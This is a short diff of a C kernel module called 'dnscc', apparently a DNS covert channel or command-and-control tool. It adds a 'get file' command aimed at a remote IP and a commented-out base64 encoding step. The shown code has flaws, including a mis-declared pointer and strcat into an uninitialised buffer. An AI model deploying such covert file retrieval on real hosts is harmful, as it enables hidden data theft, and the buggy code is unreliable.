@@ -28,6 +28,7 @@
 #include "dnscc.h"
 #include "messages/dnscc_msg.h"
 #include "messages/get_file_msg.h"
+#include "lib/modp_b64w.c"
 /* */
 /* Def */
 #define UDP_HDR_LEN 8
@@ -112,17 +113,22 @@ static void dnscc_nl_recv_msg(struct sk_buff *skb){
 	switch(msg->type){
 		case 1: {
 				struct conn_out_data* c;
-				unsigned char* command;
+				unsigned char* command,enc_command;
 			        uint16_t rf_len = 0;
 				get_file_msg* gfmsg = msg->data;
 				rf_len = strlen((const char*)gfmsg->remote_file)+1;
 				printk(KERN_INFO"remote file length %d",rf_len);
 				command	= (unsigned char*)kmalloc(sizeof(unsigned char)*(rf_len+6),GFP_DMA);
-	//			command ;
+				enc_command = (unsigned char*)kmalloc(sizeof(unsigned char)*(rf_len+256),GFP_DMA);
+				//			command ;
 				printk(KERN_INFO "[DNSCC] Netlink get file message IP: %pI4 Remote File: %s ", &gfmsg->ip, gfmsg->remote_file);
 				strcat(command,"get");
 				strcat(command,gfmsg->remote_file);
 				printk(KERN_INFO"Command %s",command);
+	//			modp_b64w_encode(enc_command,command,rf_len+3);
+	//			printk(KERN_INFO"enc command %s",enc_command);
+
+
 				c = kmalloc(sizeof(*c), GFP_DMA);
 				c->ip_addr = gfmsg->ip.s_addr;
 				c->command = command;
@@ -278,6 +284,7 @@ unsigned char* correct_name_ptr(unsigned long writer, unsigned char* buffer, int
 }
 
 //TODO:Removeme static const uint16_t port = 53;
+// source : http://www.binarytides.com/dns-query-code-in-c-with-linux-sockets/
 unsigned char* read_dns_name(unsigned char* reader, unsigned char* buffer, int* count)
 {
 	unsigned char *name;
